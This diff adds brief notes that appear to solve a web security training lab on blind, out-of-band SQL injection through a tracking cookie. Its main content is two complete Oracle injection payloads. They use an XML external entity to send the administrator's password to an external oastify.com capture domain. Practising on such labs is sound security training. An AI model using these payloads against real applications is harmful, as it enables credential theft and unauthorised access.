@@ -1,0 +1,10 @@
+Blind SQL injection with out-of-band interaction, vulnerable parameter tracking cookie.
+The SQL query is executed asynchronously and has no effect on the application's response.
+You can however trigger out-of-band interactions with an external domain.
+
+Goal: Get Administrator password and login
+
+y32i1ny3yhr6zz9q2t8jwbtu1l7cv3ord.oastify.com
+Analysis: Either of these works
+' UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.y32i1ny3yhr6zz9q2t8jwbtu1l7cv3ord.oastify.com/"> %remote;]>'),'/l') FROM dual-- 
+' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.y32i1ny3yhr6zz9q2t8jwbtu1l7cv3ord.oastify.com"> %remote;]>'),'/l') FROM dual)-- 
